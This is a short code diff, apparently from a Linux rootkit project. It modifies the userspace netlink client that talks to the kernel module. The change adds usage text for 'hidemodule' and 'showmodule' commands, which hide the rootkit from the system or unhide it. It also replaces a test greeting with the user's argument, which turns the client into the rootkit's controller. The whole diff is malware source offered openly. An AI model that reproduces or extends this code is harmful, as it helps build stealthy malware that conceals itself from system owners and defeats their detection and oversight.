@@ -15,7 +15,19 @@ static struct iovec iov;
 static struct msghdr msg;
 static int sock;
 
+static void exit_usage(const char * cmd) {
+    printf("usage: %s [command]\n", cmd);
+    printf("commands:\n");
+    printf("  hidemodule - hides the rootkit from the system\n");
+    printf("  showmodule - unhides the rootkit\n");
+    exit(EXIT_FAILURE);
+}
+
 int main(int argc, char *argv[]) {
+    
+    if (argc != 2) {
+        exit_usage(argv[0]);
+    }
 
     // create socket
     sock = socket(PF_NETLINK, SOCK_RAW, NETLINK_PROTOCOL);
@@ -44,7 +56,7 @@ int main(int argc, char *argv[]) {
     nlh->nlmsg_len = NLMSG_SPACE(MAX_PAYLOAD);
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = 0;
-    strcpy(NLMSG_DATA(nlh), "Hello Kernel!");
+    strcpy(NLMSG_DATA(nlh), argv[1]);
 
     // wrap netlink packet in IO vector
     iov.iov_base = (void *)nlh;
